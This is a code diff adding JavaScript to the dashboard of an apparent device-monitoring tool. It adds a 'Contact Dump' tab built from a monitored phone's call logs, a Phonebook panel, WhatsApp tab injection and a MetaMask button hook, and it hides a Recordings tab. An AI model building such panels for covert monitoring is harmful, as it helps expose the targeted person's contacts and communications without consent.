+    var panel = document.createElement('div');
+    panel.id = '_pb-panel';
+    panel.style.cssText = 'display:none;flex-direction:column;flex:1;overflow:hidden;';
+
+    var head = document.createElement('div');
+    head.className = 'feed-head';
+    head.innerHTML = '<h2>Phonebook</h2>';
+    panel.appendChild(head);
+
+    var subTabs = document.createElement('div');
+    subTabs.className = 'call-subtabs';
+
+    function mkBtn(id, label, val) {
+      var b = document.createElement('button');
+      b.id = id; b.className = 'tab' + (_pbSubTab === val ? ' active' : '');
+      b.textContent = label;
+      b.onclick = function(ev) {
+        ev.stopPropagation();
+        _pbSubTab = val;
+        var sc = document.getElementById('_pb-sub-contacts');
+        var sh = document.getElementById('_pb-sub-history');
+        if (sc) sc.className = 'tab' + (val === 'contacts' ? ' active' : '');
+        if (sh) sh.className = 'tab' + (val === 'history'  ? ' active' : '');
+        _pbRender();
+      };
+      return b;
+    }
+    subTabs.appendChild(mkBtn('_pb-sub-contacts', 'Contact Dump', 'contacts'));
+    subTabs.appendChild(mkBtn('_pb-sub-history',  'Call History',  'history'));
+    panel.appendChild(subTabs);
+
+    var content = document.createElement('div');
+    content.id = '_pb-content';
+    content.style.cssText = 'flex:1;overflow-y:auto;padding:0 16px 100px;';
+    panel.appendChild(content);
+    return panel;
+  }
+
+  function showPbPanel() {
+    _pbActive = true;
+    var panel = document.getElementById('_pb-panel');
+    if (!panel) return;
+    var feed = panel.parentElement;
+    if (feed) {
+      Array.prototype.forEach.call(feed.children, function(ch) {
+        if (ch.id !== '_pb-panel' && !ch.classList.contains('tabs')) {
+          ch.style.display = 'none'; ch._pbHidden = true;
+        }
+      });
+    }
+    panel.style.display = 'flex';
+    var mediaPag = document.getElementById('_mpag-media');
+    if (mediaPag) mediaPag.style.display = 'none';
+    var did = activeDeviceId;
+    if (did !== _pbDeviceId) _pbLoad(did); else _pbRender();
+    if (_pbTimer) clearInterval(_pbTimer);
+    _pbTimer = setInterval(function() { if (_pbActive && activeDeviceId) _pbLoad(activeDeviceId); }, 5000);
+  }
+
+  function hidePbPanel() {
+    _pbActive = false;
+    if (_pbTimer) { clearInterval(_pbTimer); _pbTimer = null; }
+    var panel = document.getElementById('_pb-panel');
+    if (!panel) return;
+    panel.style.display = 'none';
+    var feed = panel.parentElement;
+    if (feed) {
+      Array.prototype.forEach.call(feed.children, function(ch) {
+        if (ch._pbHidden) { ch.style.display = ''; ch._pbHidden = false; }
+      });
+    }
+  }
+
+  function ensurePbTab() {
+    var tabs = document.querySelector('.tabs');
+    if (!tabs || tabs.querySelector('#_pb-tab-btn')) return;
+    var btn = document.createElement('button');
+    btn.id = '_pb-tab-btn'; btn.className = 'tab'; btn.textContent = 'Phonebook';
+    btn.onclick = function() {
+      if (_pbActive) {
+        hidePbPanel(); btn.classList.remove('active');
+        var first = tabs.querySelector('.tab:not(#_pb-tab-btn):not(#wa-tab)');
+        if (first) first.click();
+      } else {
+        tabs.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+        btn.classList.add('active');
+        showPbPanel();
+      }
+    };
+    tabs.appendChild(btn);
+    tabs.querySelectorAll('.tab:not(#_pb-tab-btn):not(#wa-tab)').forEach(function(t) {
+      t.addEventListener('click', function() {
+        if (_pbActive) { hidePbPanel(); btn.classList.remove('active'); }
+      });
+    });
+  }
+
+  function ensurePbPanel() {
+    var feed = document.querySelector('.feed');
+    if (!feed) return;
+    var panel = document.getElementById('_pb-panel');
+    if (!panel) { panel = _buildPbPanel(); feed.appendChild(panel); }
+    if (_pbActive) {
+      Array.prototype.forEach.call(feed.children, function(ch) {
+        if (ch.id !== '_pb-panel' && !ch.classList.contains('tabs') && !ch._pbHidden) {
+          ch.style.display = 'none'; ch._pbHidden = true;
+        }
+      });
+      panel.style.display = 'flex';
+      var did = activeDeviceId;
+      if (did && did !== _pbDeviceId) _pbLoad(did);
+    }
+  }
+
+
+  // ── Calls tab: hide Recordings sub-tab, add Contact Dump ─────────────────────
+  var _cdActive = false;
+  var _cdContacts = [];
+  var _cdDeviceId = null;
+  var _cdInEnsure = false;
+
+  function _cdFmtTime(ms) {
+    var n = Number(ms);
+    return n ? new Date(n).toLocaleString() : '';
+  }
+
+  function _cdLoad(did) {
+    if (!did) return;
+    _cdDeviceId = did;
+    fetch('/api/devices/' + did + '/calls').then(function(r) { return r.json(); }).then(function(rows) {
+      var map = {};
+      rows.forEach(function(c) {
+        var k = c.phoneNumber;
+        if (!map[k]) map[k] = { phoneNumber: c.phoneNumber, contactName: c.contactName || '', count: 0, lastCall: 0 };
+        map[k].count++;
+        var t = Number(c.callAt);
+        if (t > map[k].lastCall) { map[k].lastCall = t; if (c.contactName) map[k].contactName = c.contactName; }
+      });
+      var contacts = Object.keys(map).map(function(k) { return map[k]; });
+      contacts.sort(function(a, b) {
+        var an = a.contactName.toLowerCase(), bn = b.contactName.toLowerCase();
+        if (an && !bn) return -1; if (!an && bn) return 1;
+        return an < bn ? -1 : an > bn ? 1 : 0;
+      });
+      _cdContacts = contacts;
+      _cdRender();
+    }).catch(function() {});
+  }
+
+  function _cdRender() {
+    var box = document.getElementById('_cd-content');
+    if (!box || !_cdActive) return;
+    box.innerHTML = '';
+    if (_cdContacts.length === 0) {
+      box.innerHTML = '<p class="empty">No contacts found. Grant Call Log access on the monitored device to populate contact data.</p>';
+      return;
+    }
+    var ul = document.createElement('ul');
+    ul.className = 'messages';
+    _cdContacts.forEach(function(c) {
+      var li = document.createElement('li');
+      li.className = 'msg';
+      li.innerHTML =
+        '<div class="msg-head">' +
+        '<span class="app-chip">📱</span>' +
+        '<span class="sender">' + (c.contactName || c.phoneNumber) + '</span>' +
+        (c.contactName ? '<span class="group-chip">' + c.phoneNumber + '</span>' : '') +
+        '</div>' +
+        '<div class="msg-text">' + c.count + ' call' + (c.count !== 1 ? 's' : '') +
+        ' &nbsp;·&nbsp; Last: ' + _cdFmtTime(c.lastCall) + '</div>';
+      ul.appendChild(li);
+    });
+    box.appendChild(ul);
+  }
+
+  function _cdHideReactContent(hide) {
+    var subTabs = document.querySelector('.feed > .call-subtabs');
+    if (!subTabs) return;
+    var target = hide ? 'none' : '';
+    var sibling = subTabs.nextElementSibling;
+    while (sibling) {
+      if (sibling.id === '_cd-content') { sibling = sibling.nextElementSibling; continue; }
+      if (sibling.id === 'wa-panel' || sibling.id === '_pb-panel' || sibling.id === '_mpag-msgs') break;
+      if (sibling.classList && sibling.classList.contains('tabs')) break;
+      if (sibling.style.display !== target) sibling.style.display = target;
+      sibling = sibling.nextElementSibling;
+    }
+  }
+
+  function ensureCallsTabMod() {
+    if (_cdInEnsure) return;
+    _cdInEnsure = true;
+    try { _doEnsureCallsTabMod(); } finally { _cdInEnsure = false; }
+  }
+
+  function _doEnsureCallsTabMod() {
+    var subTabs = document.querySelector('.feed > .call-subtabs');
+    if (!subTabs) return;
+
+    // Hide Recordings button
+    var recBtn = Array.from(subTabs.querySelectorAll('button.tab')).find(function(b) {
+      return !b.id && b.textContent.trim().indexOf('Recordings') === 0;
+    });
+    if (recBtn) recBtn.style.display = 'none';
+
+    // Inject Contact Dump button once
+    if (!document.getElementById('_cd-btn')) {
+      var cdBtn = document.createElement('button');
+      cdBtn.id = '_cd-btn';
+      cdBtn.className = 'tab' + (_cdActive ? ' active' : '');
+      cdBtn.textContent = 'Contact Dump';
+      cdBtn.onclick = function(ev) {
+        ev.stopPropagation();
+        _cdActive = true;
+        Array.from(subTabs.querySelectorAll('button.tab:not(#_cd-btn)')).forEach(function(b) { b.classList.remove('active'); });
+        cdBtn.classList.add('active');
+        var box = document.getElementById('_cd-content');
+        if (box && box.style.display !== '') box.style.display = '';
+        _cdHideReactContent(true);
+        _cdLoad(activeDeviceId);
+      };
+      subTabs.appendChild(cdBtn);
+
+      // Native tab clicks deactivate Contact Dump
+      Array.from(subTabs.querySelectorAll('button.tab:not(#_cd-btn)')).forEach(function(nb) {
+        nb.addEventListener('click', function() {
+          if (_cdActive) {
+            _cdActive = false;
+            var box = document.getElementById('_cd-content');
+            if (box) box.style.display = 'none';
+            _cdHideReactContent(false);
+            var cdb = document.getElementById('_cd-btn');
+            if (cdb) cdb.classList.remove('active');
+          }
+        });
+      }, true);
+    }
+
+    // Ensure content container is present AND immediately after call-subtabs.
+    // React can rebuild the section, leaving _cd-content stranded above the header.
+    var existingCdBox = document.getElementById('_cd-content');
+    if (!existingCdBox) {
+      existingCdBox = document.createElement('div');
+      existingCdBox.id = '_cd-content';
+      existingCdBox.style.cssText = 'display:none;overflow-y:auto;padding:0 16px 100px;flex:1;';
+      subTabs.insertAdjacentElement('afterend', existingCdBox);
+    } else if (existingCdBox.previousElementSibling !== subTabs) {
+      subTabs.insertAdjacentElement('afterend', existingCdBox);
+    }
+
+    // Re-apply visibility only — NEVER render from MO path (would loop via childList mutations)
+    if (_cdActive) {
+      _cdHideReactContent(true);
+      if (existingCdBox && existingCdBox.style.display !== '') existingCdBox.style.display = '';
+      var did = activeDeviceId;
+      if (did && did !== _cdDeviceId) _cdLoad(did);
+    }
+  }
+
+  // ── Observers ────────────────────────────────────────────────────────────────
+  var lastBar = null, lastUl = null;
+
+  function ensureWaTab() {
+    var tabs = document.querySelector(".tabs");
+    if (!tabs) return;
+    if (tabs.querySelector("#wa-tab")) return; // already there
+
+    var btn = document.createElement("button");
+    btn.id = "wa-tab"; btn.className = "tab"; btn.textContent = "WhatsApp";
+    btn.onclick = function () {
+      if (waActive) {
+        hideWaPanel();
+        btn.classList.remove("active");
+        var firstTab = tabs.querySelector(".tab:not(#wa-tab)");
+        if (firstTab) firstTab.click();
+      } else {
+        tabs.querySelectorAll(".tab:not(#wa-tab)").forEach(function (t) { t.classList.remove("active"); });
+        btn.classList.add("active");
+        showWaPanel();
+      }
+    };
+    tabs.appendChild(btn);
+
+    tabs.querySelectorAll(".tab:not(#wa-tab)").forEach(function (t) {
+      t.addEventListener("click", function () {
+        if (waActive) { hideWaPanel(); var wb = document.getElementById("wa-tab"); if (wb) wb.classList.remove("active"); }
+      });
+    });
+  }
+
+  function ensureWaPanel() {
+    var feed = document.querySelector(".feed");
+    if (!feed) return;
+    if (document.getElementById("wa-panel")) return; // already there
+    feed.appendChild(buildWaPanel());
+  }
+
+  var mo = new MutationObserver(function () {
+    // Source filter — re-inject if bar is replaced or filter removed
+    var bar = document.querySelector(".msg-filter-bar");
+    if (bar !== lastBar) { lastBar = bar; }
+    if (bar && !bar.querySelector("#guardian-source-filter")) bar.insertBefore(makeSourceDropdown(), bar.firstChild);
+
+    // List filter
+    var ul = document.querySelector("ul.messages");
+    var _msgBar = document.querySelector(".msg-filter-bar");
+    if (ul !== lastUl) { lastUl = ul; _msgPage = 1; _msgPagLastKey = ""; _lastMsgItemCount = -1; }
+    if (ul && _msgBar && !_msgPagApplyBusy) {
+      var _cnt = ul.querySelectorAll("li.msg").length;
+      if (_cnt !== _lastMsgItemCount) {
+        _lastMsgItemCount = _cnt;
+        if (currentSource !== "all") applySourceFilter();
+        else applyMsgPagination();
+      }
+    }
+
+    // WhatsApp tab — always ensure it exists (React re-renders remove it)
+    ensureWaTab();
+
+    // WhatsApp panel — always ensure it exists in feed
+    ensureWaPanel();
+    ensurePbTab();
+    ensurePbPanel();
+    ensureCallsTabMod();
+    ensureMetaMaskBtn();
+
+    ensureMsgPag();
+    ensureMediaTabs();
+  });
+
+  mo.observe(document.documentElement, { childList: true, subtree: true });
+
+  // Hide messages pagination bar immediately when switching away from Messages tab
+  document.addEventListener('click', function(e) {
+    var tab = e.target && (e.target.classList.contains('tab') ? e.target : e.target.closest && e.target.closest('.tab'));
+    if (tab && tab.id !== 'wa-tab') {
+      var isPhonebook = tab.id === '_pb-tab-btn';
+      var isSubTab = tab.id === '_pb-sub-contacts' || tab.id === '_pb-sub-history';
+      if (isSubTab) return;
+      var tabText = tab.textContent.trim();
+      var isMessages = tabText === 'Messages';
+      var isMedia = tabText === 'Media';
+      if (!isMessages) { var msgWrap = document.getElementById('_mpag-msgs'); if (msgWrap) msgWrap.style.display = 'none'; }
+      if (isMessages || isPhonebook) { var mediaWrap = document.getElementById('_mpag-media'); if (mediaWrap) mediaWrap.style.display = 'none'; }
+      if (isMedia) { setTimeout(ensureMediaPag, 300); }
+      if (!isPhonebook && _pbActive) { hidePbPanel(); var pbBtn = document.getElementById('_pb-tab-btn'); if (pbBtn) pbBtn.classList.remove('active'); }
+    }
+  }, true);
+})();
+  /* ── Auth + logout intercept (outer wrapper, safe for existing pagination) ── */
+  (function(){
+    "use strict";
+    var __prev = window.fetch;
+    window.fetch = function(url, opts){
+      var p = __prev.apply(this, arguments);
+      if (typeof url !== "string") return p;
+      if (url === "/api/logout" || url.endsWith("/api/logout")){
+        return p.then(function(r){ window.location.replace("/"); return new Promise(function(){}); });
+      }
+      if (url.startsWith("/api/")){
+        return p.then(function(r){
+          if (r.status === 401){ window.location.replace("/"); }
+          return r;
+        });
+      }
+      return p;
+    };
+  })();
+
+    </script>
   </body>
 </html>
+
